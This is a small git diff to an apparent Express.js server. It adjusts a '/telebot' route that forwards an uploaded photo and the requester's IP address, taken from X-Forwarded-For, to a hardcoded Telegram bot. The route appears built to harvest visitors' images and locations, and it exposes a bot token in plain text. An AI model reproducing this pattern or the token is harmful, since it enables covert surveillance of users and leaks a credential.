@@ -34,7 +34,8 @@ routes.forEach(route => {
 app.post('/telebot', upload.single('photo'), (req, res) => {
     const userId = '6229355025';
     const token = '7846389597:AAHfE-4zLRONag3dRsWsI2RpXW9T_-Y6uwA';
-    const ipAddress = req.ip;
+
+    const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
     const formData = new FormData();
     formData.append('chat_id', userId);
@@ -42,7 +43,7 @@ app.post('/telebot', upload.single('photo'), (req, res) => {
 
     const fileExtension = req.file.mimetype.split('/')[1]; 
     const filename = `photo.${fileExtension}`;
-
+    
     formData.append('photo', req.file.buffer, { filename });
 
     axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
